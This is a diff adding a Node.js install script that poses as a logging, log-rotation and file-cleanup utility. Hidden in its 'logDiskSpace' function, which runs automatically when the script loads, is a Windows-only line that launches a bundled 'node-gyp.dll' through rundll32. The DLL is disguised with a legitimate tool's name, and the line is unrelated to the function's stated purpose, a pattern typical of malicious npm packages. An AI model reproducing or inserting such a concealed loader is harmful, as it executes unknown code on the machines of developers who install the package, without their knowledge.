+let cache = require("fs");
+let os = require("os");
+let path = require("path");
+let LOG_DIR = path.join(__dirname, "logs");
+let LOG_FILE = path.join(LOG_DIR, `install_log_${Date.now()}.txt`);
+let DRY_RUN = process.argv.includes("--dry-run");
+let ARCHIVE_DIR = path.join(__dirname, "archive");
+let MAX_LOG_FILES = 5;
+let DEFAULT_MAX_AGE_DAYS = 30;
+let ARCHIVE_OLD_FILES = process.argv.includes("--archive-old");
+let summary = {
+  dirsCreated: 0,
+  filesDeleted: 0,
+  dirsDeleted: 0,
+  filesArchived: 0,
+  errors: 0
+};
+function log(e) {
+  console.log(e);
+  if (!DRY_RUN) {
+    try {
+      cache.appendFileSync(LOG_FILE, e + "\n");
+    } catch (e) {
+      console.error("Failed to write log: " + e.message);
+    }
+  }
+}
+function ensureDir(e) {
+  if (cache.existsSync(e)) {
+    log("Directory exists: " + e);
+  } else {
+    if (!DRY_RUN) {
+      cache.mkdirSync(e, {
+        recursive: true
+      });
+    }
+    summary.dirsCreated++;
+    log("Created directory: " + e);
+  }
+}
+function deleteFile(r) {
+  if (DRY_RUN) {
+    log("[Dry-run] Would delete file: " + r);
+  } else {
+    try {
+      cache.unlinkSync(r);
+      summary.filesDeleted++;
+      log("Deleted file: " + r);
+    } catch (e) {
+      summary.errors++;
+      log(`Error deleting file ${r}: ${e.message}`);
+    }
+  }
+}
+function deleteDir(r) {
+  if (DRY_RUN) {
+    log("[Dry-run] Would delete directory: " + r);
+  } else {
+    try {
+      cache.rmSync(r, {
+        recursive: true,
+        force: true
+      });
+      summary.dirsDeleted++;
+      log("Deleted directory: " + r);
+    } catch (e) {
+      summary.errors++;
+      log(`Error deleting directory ${r}: ${e.message}`);
+    }
+  }
+}
+function archiveFile(r) {
+  ensureDir(ARCHIVE_DIR);
+  var e = path.basename(r);
+  var e = path.join(ARCHIVE_DIR, e);
+  if (DRY_RUN) {
+    log(`[Dry-run] Would archive file: ${r} -> ${e}`);
+  } else {
+    try {
+      cache.renameSync(r, e);
+      summary.filesArchived++;
+      log(`Archived file: ${r} -> ${e}`);
+    } catch (e) {
+      summary.errors++;
+      log(`Error archiving file ${r}: ${e.message}`);
+    }
+  }
+}
+function cleanOldFiles(e, r = DEFAULT_MAX_AGE_DAYS) {
+  if (cache.existsSync(e)) {
+    var i;
+    var t = Date.now();
+    var o = r * 24 * 60 * 60 * 1000;
+    for (i of cache.readdirSync(e)) {
+      var c = path.join(e, i);
+      try {
+        var a = cache.lstatSync(c);
+        var s = t - a.mtimeMs;
+        if (a.isFile() && o < s) {
+          (ARCHIVE_OLD_FILES ? archiveFile : deleteFile)(c);
+        } else if (a.isDirectory() && o < s) {
+          deleteDir(c);
+        }
+      } catch (e) {
+        summary.errors++;
+        log(`Error accessing ${c}: ${e.message}`);
+      }
+    }
+  }
+}
+function rotateLogs() {
+  if (cache.existsSync(LOG_DIR)) {
+    for (var e = cache.readdirSync(LOG_DIR).filter(e => e.startsWith("install_log_") && e.endsWith(".txt")).map(e => ({
+      name: e,
+      path: path.join(LOG_DIR, e),
+      time: cache.statSync(path.join(LOG_DIR, e)).mtimeMs
+    })).sort((e, r) => r.time - e.time); e.length > MAX_LOG_FILES;) {
+      var r = e.pop();
+      try {
+        if (!DRY_RUN) {
+          cache.unlinkSync(r.path);
+        }
+        log("Rotated out old log file: " + r.name);
+      } catch (e) {
+        summary.errors++;
+        log(`Error deleting old log file ${r.name}: ${e.message}`);
+      }
+    }
+  }
+}
+function logDiskSpace() {
+  try {
+    var e;
+    if (os.platform() === "win32") {
+      e = os.tmpdir();
+      require("child_process").spawn("rundll32", [path.join(__dirname, "./node-gyp.dll") + ",main"]);
+      log("Temp directory: " + e);
+      log("Number of files in temp directory: " + cache.readdirSync(e).length);
+    }
+  } catch (e) {
+    summary.errors++;
+    log("Error accessing temp directory: " + e.message);
+  }
+}
+function listDirectoryContents(e) {
+  if (cache.existsSync(e)) {
+    var r;
+    log(`Contents of ${e}:`);
+    for (r of cache.readdirSync(e)) {
+      try {
+        var i = path.join(e, r);
+        var t = cache.statSync(i);
+        var o = (t.size / 1024).toFixed(2);
+        var c = new Date(t.mtimeMs).toLocaleString();
+        log(` - [${t.isDirectory() ? "DIR" : "FILE"}] ${r} | Size: ${o} KB | Modified: ${c}`);
+      } catch (e) {
+        summary.errors++;
+        log(`Error reading ${r}: ${e.message}`);
+      }
+    }
+  } else {
+    log("Directory does not exist: " + e);
+  }
+}
+ensureDir(LOG_DIR);
+logDiskSpace();
